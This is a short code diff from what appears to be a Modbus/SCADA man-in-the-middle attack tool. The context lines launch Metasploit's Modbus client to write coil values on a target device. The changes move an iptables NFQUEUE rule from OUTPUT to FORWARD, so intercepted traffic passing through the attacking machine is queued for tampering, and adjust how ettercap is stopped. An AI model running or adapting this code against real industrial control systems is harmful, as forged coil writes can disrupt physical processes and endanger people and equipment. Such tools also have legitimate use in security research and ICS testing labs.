@@ -320,7 +320,7 @@ def fool():
             #try:
             subprocess.Popen("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm_config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set RPORT " + nm_config.mod_port + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run;\"", shell=True, preexec_fn=os.setpgrp)
             #except:
-            subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)
+            subprocess.run(["iptables", "-A", "FORWARD", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)
 
             
             
@@ -439,7 +439,7 @@ modified by Jesse Cutshall
                 setconfig()
             elif select == "q":
                 print("Exiting...")
-                os.system("sudo killall ettercap")
+                os.system("killall ettercap")
                 sys.exit(0)
             else:
                 print("Invalid option\n")
